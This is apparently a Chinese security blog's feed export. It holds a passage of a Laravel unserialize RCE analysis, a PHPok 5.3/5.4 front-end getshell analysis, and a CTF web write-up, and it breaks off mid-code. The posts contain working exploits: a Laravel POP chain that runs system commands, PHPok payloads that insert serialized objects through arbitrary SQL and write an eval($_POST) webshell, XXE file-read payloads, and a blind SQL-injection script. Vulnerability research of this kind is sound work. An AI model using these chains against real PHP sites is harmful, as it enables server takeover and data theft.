php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">GenericUser</span>&#123;        protected $attributes=array('expectedOutput'=&gt;array("0"=&gt;'1'),'expectedQuestions'=&gt;array("0"=&gt;"1"));    &#125;&#125;</code></pre><p><img src="./1576310578708.png" srcset="/img/loading.gif" alt="1576310578708"></p><p>继续<strong>debug</strong>,down在bind函数实现这里</p><p><img src="./1576310719920.png" srcset="/img/loading.gif" alt="1576310719920"></p><p>这里app可控，找到实现bind方法的类,全局搜索发现类Container满足</p><p>src/Illuminate/Contracts/Container/Container.php</p><p><img src="./1576306172540.png" srcset="/img/loading.gif" alt="1576306172540"></p><p>成功执行完<code>mockConsoleOutput</code>方法，接下来就是解决这一行，会从<strong>app</strong>对象中取出<code>[Kernel:;class]</code>实例化</p><p><img src="./1576310799515.png" srcset="/img/loading.gif" alt="1576310799515"></p><p>debug跟进到<code>resolve</code>方法，直接利用这里的return 退出函数，如果不结束执行，之后会实例化<code>Illuminate\Contracts\Console\Kernel</code>类，该类为接口类无法实例化，爆ERROR</p><p><img src="./1576311016421.png" srcset="/img/loading.gif" alt="1576311016421"></p><p>由于这里是类变量是可控的，直接全局找可以调用到<code>call</code>方法,定位到<code>\Illuminate\Foundation\Application</code>类，该类父类实现了<code>call</code></p><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Container</span>&#123;        <span class="hljs-title">protected</span>  $<span class="hljs-title">instances</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-string">'Illuminate\Contracts\Console\Kernel'</span>]=<span class="hljs-keyword">new</span> \Illuminate\Foundation\Application();        &#125;    &#125;&#125;</code></pre><p>最后调用<code>call_user_func_array</code>成功执行代码</p><p><img src="./1576309792274.png" srcset="/img/loading.gif" alt="1576309792274"></p><p><img src="./1576311201123.png" srcset="/img/loading.gif" alt="1576311201123"></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Testing</span>&#123;<span class="hljs-title">class</span> <span class="hljs-title">PendingCommand</span>&#123;    protected $command = 'system';    <span class="hljs-keyword">protected</span> $parameters = <span class="hljs-keyword">array</span>(<span class="hljs-string">'cat /etc/passwd'</span>);    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">protected</span> $app;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($test)</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test=$test;        <span class="hljs-keyword">$this</span>-&gt;app=<span class="hljs-keyword">new</span> \Illuminate\Container\Container();    &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Container</span>&#123;        <span class="hljs-title">protected</span>  $<span class="hljs-title">instances</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-string">'Illuminate\Contracts\Console\Kernel'</span>]=<span class="hljs-keyword">new</span> \Illuminate\Foundation\Application();        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Application</span>&#123;    &#125;&#125;<span class="hljs-title">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">GenericUser</span>&#123;        protected $attributes=array('expectedOutput'=&gt;array("0"=&gt;'1'),'expectedQuestions'=&gt;array("0"=&gt;"1"));    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">echo</span> <span class="hljs-title">urlencode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Testing</span>\<span class="hljs-title">PendingCommand</span>((<span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>\<span class="hljs-title">GenericUser</span>()))));&#125;</code></pre><p><img src="./1576311335481.png" srcset="/img/loading.gif" alt="1576311335481"></p><h1 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a>Picture</h1><p><img src="./2019-12-14_161623.png" srcset="/img/loading.gif" alt="2019-12-14_161623"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://adm1n.design/2019/08/15/laravel5.7-unserialize-RCE/#PendingCommand" target="_blank" rel="noopener">http://adm1n.design/2019/08/15/laravel5.7-unserialize-RCE/#PendingCommand</a></p><p><a href="https://mochazz.github.io/2019/08/05/Laravel5.8.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83" target="_blank" rel="noopener">https://mochazz.github.io/2019/08/05/Laravel5.8.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83</a></p><p><a href="https://www.4hou.com/web/19312.html" target="_blank" rel="noopener">https://www.4hou.com/web/19312.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPok 5.4/5.3前台getshell分析思考(踩坑)</title>
    <link href="/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/"/>
    <url>/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天抽空审了下PHPOK5.4发现很多洞都是在后台，前台的洞才是真理!!!!．也发现前台一处可疑的文件写入，但是必须配合后台的洞显得就很鸡肋，之后在研究下．</p><p>学长晚上发了篇PHPOK前台geshell遂分析复现．讲道理最近看RIPS很多洞的反序列都是从sql注入开始，有点巧合.(….</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol><li>不做判断过滤将用户输入的字段通过<code>array_merge</code>存入危险数组中</li><li>任意执行SQL语句</li><li>从数据库中取出字段能够被反序列化</li><li>任意文件写入</li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞触发入口：framework/api/call_control.php</p><p>将用户输入json格式data值传入<code>phpok</code>函数</p><p><img src="./1576074296201.png" srcset="/img/loading.gif" alt="1576074296201"></p><p>接着跟进:framework/phpok_tpl_helper.php</p><p><img src="./1576073894768.png" srcset="/img/loading.gif" alt="1576073894768"></p><p>跟进framework/phpok_call.php phpok方法，在第102行中将用户输入的json格式<code>rs</code>存入<code>$call_rs</code>数组中</p><p>再通过第119行调用’type_id’键(可控)</p><p><img src="./1576074462677.png" srcset="/img/loading.gif" alt="1576074462677"></p><p>接着代码执行到133执行函数</p><p><img src="./1576074642832.png" srcset="/img/loading.gif" alt="1576074642832"></p><p>接下来就是找利用的函数,可调用函数<code>$func</code>可以查找framework/phpok_call.php文件中以下划线开头的函数如<code>_sql</code>,<code>_arclist</code>….</p><p>直接跟进<code>_sql</code>函数,会执行<code>get_all</code>，且其中$rs[‘sqlinfo’]可控，可以通过上面array_merge存入$rs数组中</p><p><img src="./1576074696932.png" srcset="/img/loading.gif" alt="1576074696932"></p><p>最后代码会$rs[‘sqlinfo’]语句会代入query方法执行任意SQL语句</p><p><img src="./1576074837952.png" srcset="/img/loading.gif" alt="1576074837952"></p><p>再找可以getshell的点，<code>_fields</code>函数出存在反序列化，反序列化的值是由数据库中带出.以前就关注过这里的反序列化，但是没有去深究如何控制这里的变量．</p><p><img src="./1576074931751.png" srcset="/img/loading.gif" alt="1576074931751"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="执行任意sql语句"><a href="#执行任意sql语句" class="headerlink" title="执行任意sql语句"></a>执行任意sql语句</h2><p>构造POP</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'osword'</span>;    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;&#125;<span class="hljs-keyword">echo</span> bin2hex(serialize(<span class="hljs-keyword">new</span> cache()));<span class="hljs-comment">#$b=hex2bin($a);</span><span class="hljs-number">4</span>f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d</code></pre><pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"INSERT INTO `phpok5`.`qinggan_fields`(`id`, `ftype`, `title`, `identifier`, `field_type`, `note`, `form_type`, `form_style`, `format`, `content`, `ext`, `search_separator`, `form_class`) VALUES (988, '988', 'test', 'test', 'varchar', 'test', 'text', 'test', 'safe', 'test',0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d,'test', 'test')"</span>&#125;&#125;</code></pre><p><img src="./1576073177233.png" srcset="/img/loading.gif" alt="1576073177233"></p><p>打入如下payload</p><p>由于最后从<strong>qinggan_fields</strong>表中取出的数据是从<strong>qinggan_module</strong>表中依据<code>module</code>字段取数据,在满足IF语句从<strong>qinggan_module</strong>表取的数据需要带<code>status</code>,<code>module</code>，该处module字段值后前面打入payload的<code>ftype</code>值相同，具体原因可以自行调试</p><pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"INSERT INTO `phpok5`.`qinggan_project` (`id`,`module`,`status`,`site_id`,`title`,`nick_title`,`tpl_index`,`tpl_list`,`tpl_content`,`ico`,`orderby`,`alias_title`,`alias_note`,`identifier`,`seo_title`,`seo_keywords`,`seo_desc`,`admin_note`,`post_tpl`,`etpl_admin`,`etpl_user`,`etpl_comment_admin`,`etpl_comment_user`,`tag`,`list_fields`,`style`) values(988,988,66,1,'test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test')"</span>&#125;&#125;</code></pre><p><img src="./1576069510643.png" srcset="/img/loading.gif" alt="1576069510643"></p><p><img src="./1576073388011.png" srcset="/img/loading.gif" alt="1576073388011"></p><p>在执行即可在网站根目录生成shell</p><pre><code class="hljs llvm">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok<span class="hljs-number">5.4</span>/api.php?<span class="hljs-keyword">c</span>=<span class="hljs-keyword">call</span>&amp;f=index&amp;data=&#123;<span class="hljs-symbol">%22</span>m_picplayer<span class="hljs-symbol">%22</span>:&#123;<span class="hljs-symbol">%22</span>site<span class="hljs-symbol">%22</span>:<span class="hljs-number">1</span>,<span class="hljs-symbol">%22</span>type_id<span class="hljs-symbol">%22</span>:<span class="hljs-symbol">%22</span>fields<span class="hljs-symbol">%22</span>,<span class="hljs-symbol">%22</span>pid<span class="hljs-symbol">%22</span>:<span class="hljs-number">988</span>&#125;&#125;</code></pre><p><img src="./1576073122835.png" srcset="/img/loading.gif" alt="1576073122835"></p><h1 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h1><p>有一处利用比较繁琐,但是有任意sql语句执行</p><p>限制：需要一个前台会员账户,或者通过任意sql注入得到用户session_id</p><p>漏洞位置：framework/model/cart.php</p><p>因为$val最后是从数据库中取出,所以可以通过任意sql语句修改数据库达到getshell目的</p><p><img src="./1576119275513.png" srcset="/img/loading.gif" alt="1576119275513"></p><ol><li><p>操作购物车需要判断身份,如果没有账号,可以通过sql注入注出<code>qinggan_cart</code> 的session_id字段</p></li><li><p>执行代码url:<a href="http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=福州市&amp;city=三明市,传入的`id`值可以在添加购物车后回显得知,直接令`address_id=0`" target="_blank" rel="noopener">http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=福州市&amp;city=三明市,传入的`id`值可以在添加购物车后回显得知,直接令`address_id=0`</a></p></li></ol><p>   当然这里也可以直接越权,直接到后台,就有一大堆洞</p><p>   <img src="./1576120808919.png" srcset="/img/loading.gif" alt="1576120808919"></p><p>   <img src="./1576119462806.png" srcset="/img/loading.gif" alt="1576119462806"></p><ol start="3"><li><p>最后满足需要的其他条件,修改qinggan_freight_price表中price字段,就可以执行代码</p><pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"update `phpok54`.`qinggan_freight_price` set price=0x706870696E666F28293B2F2F4E where zid=25"</span>&#125;&#125;</code></pre></li></ol><p><img src="./1576120561220.png" srcset="/img/loading.gif" alt="1576120561220"></p><p>访问：<a href="http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=%E7%A6%8F%E5%B7%9E%E5%B8%82&amp;city=%E4%B8%89%E6%98%8E%E5%B8%82" target="_blank" rel="noopener">http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=%E7%A6%8F%E5%B7%9E%E5%B8%82&amp;city=%E4%B8%89%E6%98%8E%E5%B8%82</a></p><p><img src="./1576121332860.png" srcset="/img/loading.gif" alt="1576121332860"></p><h1 id="phpok-5-3"><a href="#phpok-5-3" class="headerlink" title="phpok 5.3"></a>phpok 5.3</h1><p><strong>环境：在form_type=’url’情况下,php5.6无法成功，php7.3成功,php7.0能够写文件但是文件中没内容</strong></p><p>反序列化之后会调用,改行会去取<code>$value[&#39;content&#39;]</code>对象中的属性，造成无法成功调用爆ERROR程序终止，，无法成功执行<code>__destruct</code></p><pre><code class="hljs markdown">$url = $this-&gt;site[<span class="hljs-string">'url_type'</span>] == 'rewrite' ? $value[<span class="hljs-string">'content'</span>][<span class="hljs-symbol">'rewrite'</span>] : $value[<span class="hljs-string">'content'</span>][<span class="hljs-symbol">'default'</span>];</code></pre><p><img src="./1576237048076.png" srcset="/img/loading.gif" alt="1576237048076"></p><p>七月火师傅解决了再借作者评论回复，这里填下坑</p><p><img src="./1576239519071.png" srcset="/img/loading.gif" alt="1576239519071"></p><p><img src="./1576239482268.png" srcset="/img/loading.gif" alt="1576239482268"></p><p>可以在本地测试下，如果调用不到对象数组属性会造成什么情况</p><p>如下可以得出，由于$a调用了不存在属性值，爆<code>Error</code>,而无法成功执行<code>__destruct</code></p><p><img src="./1576237474445.png" srcset="/img/loading.gif" alt="1576237474445"></p><p>但是这里又有个坑，在phpok5.3中7.3可以即使报错依然继续执行代码</p><p>php7.3环境下，执行<code>__get</code>　再执行三元式返回null,程序继续执行</p><p><img src="./1576238022496.png" srcset="/img/loading.gif" alt="1576238022496"></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><strong>适用php7.3</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'/var/www/html/cms/5.3/shell'</span>;    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;&#125;$str1 = json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">'m_picplayer'</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'site'</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">'type_id'</span>=&gt;<span class="hljs-string">'format_ext_all'</span>,<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'form_type'</span>=&gt;<span class="hljs-string">'url'</span>,<span class="hljs-string">'content'</span>=&gt;serialize(<span class="hljs-keyword">new</span> cache())))));<span class="hljs-keyword">print</span>(urlencode($str1));</code></pre><p><strong>适用php5.6,php7.3</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'/var/www/html/cms/5.3/shell'</span>;    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;&#125;$str1 = json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">'m_picplayer'</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'site'</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">'type_id'</span>=&gt;<span class="hljs-string">'format_ext_all'</span>,<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'form_type'</span>=&gt;<span class="hljs-string">'editor'</span>,<span class="hljs-string">'content'</span>=&gt;<span class="hljs-string">'fuck'</span>,<span class="hljs-string">'ext'</span>=&gt;serialize(<span class="hljs-keyword">new</span> cache())))));<span class="hljs-keyword">print</span>(urlencode($str1));</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/194453" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194453</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WRITEUP]2019NJUPT web题解</title>
    <link href="/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考试错过了比赛，题目还没关，拿学长WP<a href="https://nikoeurus.github.io/" target="_blank" rel="noopener">@somnus</a>复现一波</p><h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE a [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">passwd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///flag"</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;passwd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;passwd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre><p><img src="./1574570528817.png" srcset="/img/loading.gif" alt="1574570528817"></p><h1 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h1><p>按第一题payload打无法读到flag,为空,也无法执行命令</p><p>尝试查内网</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE a [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">passwd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///proc/net/arp"</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;passwd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;passwd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre><p><img src="./1574572925507.png" srcset="/img/loading.gif" alt="1574572925507"></p><p>丢到intruder模块遍历</p><p><img src="./1574573011186.png" srcset="/img/loading.gif" alt="1574573011186"></p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>一个sql注入</p><p><img src="./1574573615871.png" srcset="/img/loading.gif" alt="1574573615871"></p><p>提示我们需要得到结果</p><p><img src="./1574573610718.png" srcset="/img/loading.gif" alt="1574573610718"></p><p>注入发现<code>&#39;</code>被过滤,但是<code>\</code>未被转义</p><p>这样就可以用username符号前面单引号去闭合password单引号,但是最后一个单引号需要注释,常用注释符号被过滤完</p><p>查了而下<code>%00</code>可以用来注释</p><p><img src="./1574573597217.png" srcset="/img/loading.gif" alt="1574573597217"></p><p>得到一个302跳转</p><pre><code class="hljs php">username=<span class="hljs-number">123</span>\&amp;passwd=||<span class="hljs-number">1</span>;%<span class="hljs-number">00</span></code></pre><p><img src="./1574573767033.png" srcset="/img/loading.gif" alt="1574573767033"></p><p>需要注出password字段</p><p><img src="./1574573840920.png" srcset="/img/loading.gif" alt="1574573840920"></p><p>select被过滤,但是问题不打,因为是在同一个表内,可以直接操作passwd列名.</p><p>现在就是要构造语句,sleep被过滤无法延时,只能考虑bool盲注</p><p>利用正则匹配进行盲注</p><p><img src="./1574574240423.png" srcset="/img/loading.gif" alt="1574574240423"></p><p>逻辑很简单,</p><pre><code class="hljs yaml"><span class="hljs-literal">true</span> <span class="hljs-string">=&gt;</span> <span class="hljs-number">302</span><span class="hljs-literal">false</span> <span class="hljs-string">=&gt;</span> <span class="hljs-number">200</span></code></pre><p>需要注意数据字段表中还有其他password值,需要先确定第一个字符</p><p>跑完脚本发现第一个字段为<code>y</code>后续结果较合理</p><p>exp</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringstr1 = string.ascii_letters+<span class="hljs-string">'_'</span>+string.digitsurl = <span class="hljs-string">"http://nctf2019.x1ct34m.com:40005"</span>tmp = <span class="hljs-string">'79'</span>result=<span class="hljs-string">'y'</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:        data = &#123;            <span class="hljs-string">'username'</span>:<span class="hljs-string">"0\\"</span>,            <span class="hljs-string">'passwd'</span>:<span class="hljs-string">f'||passwd/**/regexp/**/0x<span class="hljs-subst">&#123;str(tmp)+hex(ord(j))[<span class="hljs-number">2</span>:]&#125;</span>;<span class="hljs-subst">&#123;chr(<span class="hljs-number">0</span>)&#125;</span>'</span>        &#125;        <span class="hljs-comment">#print(data)</span>        rep = requests.post(url,data=data)        <span class="hljs-comment">#print(rep.status_code)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">"back to get"</span> <span class="hljs-keyword">in</span> rep.text:            tmp+=hex(ord(j))[<span class="hljs-number">2</span>:]            result+=j            print(result)            <span class="hljs-keyword">break</span><span class="hljs-comment">#you_will_never_know7788990</span></code></pre><p><img src="./1574576307617.png" srcset="/img/loading.gif" alt="1574576307617"></p><p>任意用户名+’you_will_never_know7788990’ 即可得到flag</p><p><img src="./1574576370940.png" srcset="/img/loading.gif" alt="1574576370940"></p><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> error_reporting(<span class="hljs-number">0</span>); highlight_file(<span class="hljs-keyword">__file__</span>); $string_1 = $_GET[<span class="hljs-string">'str1'</span>]; $string_2 = $_GET[<span class="hljs-string">'str2'</span>]; $cmd = $_GET[<span class="hljs-string">'q_w_q'</span>]; <span class="hljs-comment">//1st </span><span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'num'</span>] !== <span class="hljs-string">'23333'</span> &amp;&amp; preg_match(<span class="hljs-string">'/^23333$/'</span>, $_GET[<span class="hljs-string">'num'</span>]))&#123;     <span class="hljs-keyword">echo</span> <span class="hljs-string">'1st ok'</span>.<span class="hljs-string">"&lt;br&gt;"</span>; &#125; <span class="hljs-keyword">else</span>&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">'23333333'</span>); &#125; <span class="hljs-comment">//2nd </span><span class="hljs-keyword">if</span>(is_numeric($string_1))&#123;     $md5_1 = md5($string_1);     $md5_2 = md5($string_2);     <span class="hljs-keyword">if</span>($md5_1 != $md5_2)&#123;         $a = strtr($md5_1, <span class="hljs-string">'cxhp'</span>, <span class="hljs-string">'0123'</span>);         $b = strtr($md5_2, <span class="hljs-string">'cxhp'</span>, <span class="hljs-string">'0123'</span>);         <span class="hljs-keyword">if</span>($a == $b)&#123;             <span class="hljs-keyword">echo</span> <span class="hljs-string">'2nd ok'</span>.<span class="hljs-string">"&lt;br&gt;"</span>;         &#125;         <span class="hljs-keyword">else</span>&#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">"can u give me the right str???"</span>);         &#125;     &#125;      <span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">"no!!!!!!!!"</span>);     &#125; &#125; <span class="hljs-keyword">else</span>&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">'is str1 numeric??????'</span>); &#125; <span class="hljs-comment">//3rd </span>$query = $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>]; <span class="hljs-keyword">if</span> (strlen($cmd) &gt; <span class="hljs-number">8</span>)&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">"too long :("</span>); &#125; <span class="hljs-keyword">if</span>( substr_count($query, <span class="hljs-string">'_'</span>) === <span class="hljs-number">0</span> &amp;&amp; substr_count($query, <span class="hljs-string">'%5f'</span>) === <span class="hljs-number">0</span> )&#123;     $arr = explode(<span class="hljs-string">' '</span>, $cmd);     <span class="hljs-keyword">if</span>($arr[<span class="hljs-number">0</span>] !== <span class="hljs-string">'ls'</span> || $arr[<span class="hljs-number">0</span>] !== <span class="hljs-string">'pwd'</span>)&#123;         <span class="hljs-keyword">if</span>(substr_count($cmd, <span class="hljs-string">'cat'</span>) === <span class="hljs-number">0</span>)&#123;             system($cmd);         &#125;         <span class="hljs-keyword">else</span>&#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">'ban cat :) '</span>);         &#125;     &#125;     <span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">'bad guy!'</span>);     &#125; &#125; <span class="hljs-keyword">else</span>&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">'nonono _ is bad'</span>); &#125; <span 